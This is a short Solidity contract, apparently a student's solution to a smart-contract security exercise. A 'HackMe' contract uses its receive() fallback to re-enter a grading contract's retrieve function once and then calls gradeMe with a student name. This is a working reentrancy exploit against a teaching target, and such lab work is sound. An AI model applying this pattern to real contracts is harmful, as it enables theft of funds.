// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "./GradeMe.sol";

contract HackMe {

    Grader5 private gradeMeSC;
    uint public counter;

    constructor(address _gradeMeSC) payable {
        gradeMeSC = Grader5(_gradeMeSC);
        counter = 0;
    }

    event Received(address sender, uint amount);

    receive() external payable {
        emit Received(msg.sender, msg.value);
        if(counter < 1) {
            gradeMeSC.retrieve{value: 4}();
            ++counter;
        }
        gradeMeSC.gradeMe("Cristian Alinez");
    }

    function hack() external {
        if(counter < 1) {
            gradeMeSC.retrieve{value: 4}();
        }
        gradeMeSC.gradeMe("Alinez");
    }

    
}